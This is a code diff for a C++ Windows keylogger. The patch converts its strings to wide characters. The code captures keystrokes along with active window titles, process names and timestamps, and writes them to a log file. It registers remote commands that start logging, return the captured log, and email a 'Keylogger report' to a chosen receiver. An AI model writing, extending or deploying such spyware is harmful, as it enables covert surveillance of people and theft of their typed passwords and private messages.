@@ -3,35 +3,35 @@
 
 
 Keylogger::Keylogger() {
-	CommandParser::addCommand("email", [this](std::string argStr) {
+	CommandParser::addCommand(L"email", [this](std::wstring argStr) {
 		bool result = this->sendEmailReport(argStr, false);
-		auto receiverStr = argStr == "" ? "default receiver" : argStr;
+		auto receiverStr = argStr == L"" ? L"default receiver" : argStr;
 		if (result) {
-			return "Report to " + receiverStr + " successfully sent";
+			return L"Report to " + receiverStr + L" successfully sent";
 		} else {
-			return "Can't send report to " + receiverStr;
+			return L"Can't send report to " + receiverStr;
 		}
 	});
-	CommandParser::addCommand("on", [this](std::string argStr) {
+	CommandParser::addCommand(L"on", [this](std::wstring argStr) {
 		this->start();
-		return "Logging started successfully";
+		return L"Logging started successfully";
 	});
-	CommandParser::addCommand("off", [this](std::string argStr) {
+	CommandParser::addCommand(L"off", [this](std::wstring argStr) {
 		//this->stop();
-		return "Not working for now";
+		return L"Not working for now";
 	});
-	CommandParser::addCommand("get", [this](std::string argStr) {
+	CommandParser::addCommand(L"get", [this](std::wstring argStr) {
 		logFile.close();
 		std::ifstream logData;
 		logData.open(this->FILENAME, std::ios::in);
-		std::string data((std::istreambuf_iterator<char>(logData)),
+		std::wstring data((std::istreambuf_iterator<char>(logData)),
 			std::istreambuf_iterator<char>());
 		logData.close();
 		logFile.open(this->FILENAME, std::ios::app);
 		return data;
 	});
-	CommandParser::addCommand("block", [this](std::string argStr) {
-		return "Not implemented now";
+	CommandParser::addCommand(L"block", [this](std::wstring argStr) {
+		return L"Not implemented now";
 	});
 
 	
@@ -54,8 +54,8 @@ void Keylogger::keyboardHandler(const wchar_t* keyText) {
 	addWindowTimeStamps();
 		
 	auto symbol = keyText;
-	logFile << StringUtilities::wcharToStr(keyText) << std::flush;
-	std::cout << StringUtilities::wcharToStr(keyText) << std::flush;
+	logFile << StringUtilities::wstrToChars(keyText) << std::flush;
+	std::cout << StringUtilities::wstrToChars(keyText) << std::flush;
 }
 
 void Keylogger::addWindowTimeStamps() {
@@ -86,12 +86,12 @@ void Keylogger::addWindowTimeStamps() {
 		if (bufferTitle == nullptr || bufferTitle[0] == '\0') {
 			std::cout << "!!!!ploho!!!";
 		} else {
-			std::cout << "\n### " << StringUtilities::wcharToStr(bufferProcessName) <<
-				" --- " << StringUtilities::wcharToStr(bufferTitle) << " ### " << timeStrBuffer << " ###\n";
+			std::cout << "\n### " << StringUtilities::wstrToChars(bufferProcessName) <<
+				" --- " << StringUtilities::wstrToChars(bufferTitle) << " ### " << timeStrBuffer << " ###\n";
 		}
 
-		logFile << "\n### " << StringUtilities::wcharToStr(bufferProcessName) << " --- " <<
-			StringUtilities::wcharToStr(bufferTitle) << " ### " << timeStrBuffer << " ###\n";
+		logFile << "\n### " << StringUtilities::wstrToChars(bufferProcessName) << " --- " <<
+			StringUtilities::wstrToChars(bufferTitle) << " ### " << timeStrBuffer << " ###\n";
 	}
 }
 
@@ -107,18 +107,18 @@ Keylogger::~Keylogger() {
 	stop();
 }
 
-bool Keylogger::sendEmailReport(std::string emailTo, bool deleteLocal) {
+bool Keylogger::sendEmailReport(std::wstring emailTo, bool deleteLocal) {
 	auto emailService = make_shared<EmailService>();
 
 	// Create email subject
-	std::stringstream subject;
+	std::wstringstream subject;
 	subject << "Keylogger report. " << "Compname";
 
 	// Create email body
 	logFile.close();
 	std::ifstream logData;
 	logData.open(this->FILENAME, std::ios::in);
-	std::string body((std::istreambuf_iterator<char>(logData)),
+	std::wstring body((std::istreambuf_iterator<char>(logData)),
 		std::istreambuf_iterator<char>());
 	logData.close();
 
